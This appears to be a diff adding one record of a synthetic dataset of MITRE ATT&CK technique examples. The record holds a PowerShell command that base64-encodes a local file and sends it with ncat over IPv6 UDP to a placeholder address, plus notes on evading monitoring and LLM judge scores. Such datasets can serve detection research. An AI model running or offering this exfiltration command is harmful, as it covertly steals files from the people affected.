@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 -u --source-port 60999 2001:db8:dead:beef::24 57777 --send-only",
+  "explanation": "Exfiltrates over IPv6 UDP using an uncommon fixed source and destination port to avoid typical monitored services. This leverages an alternative medium/protocol from usual C2 channels, consistent with T1011.",
+  "rationale_steps": [
+    "Base64-encode content to blend payload bytes.",
+    "Send via IPv6 UDP with unusual source/destination ports to separate from common traffic."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-40a7ef4f",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, proper separators, and valid ncat options and argument order.",
+        "semantic_score": 4,
+        "semantic_justification": "It base64-encodes a file and sends it via ncat over IPv6 UDP with a specified source port consistent with automated exfiltration, though PowerShell\u2019s default stdin encoding to native executables may introduce UTF-16LE bytes.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:14:52.126582Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses, proper variable assignment, correct piping, and valid PowerShell syntax for base64 conversion and file reading.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by reading a file, encoding it to base64, and transmitting it over IPv6 UDP using ncat with specific source and destination ports, aligning perfectly with T1011.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:14:54.865328Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct Powershell syntax for method calls, variable assignment, command separation, and valid ncat.exe flags and arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the stated intent of exfiltrating data via IPv6 UDP using uncommon source/destination ports, aligning precisely with the T1011 technique for automated exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:40:46.438390Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
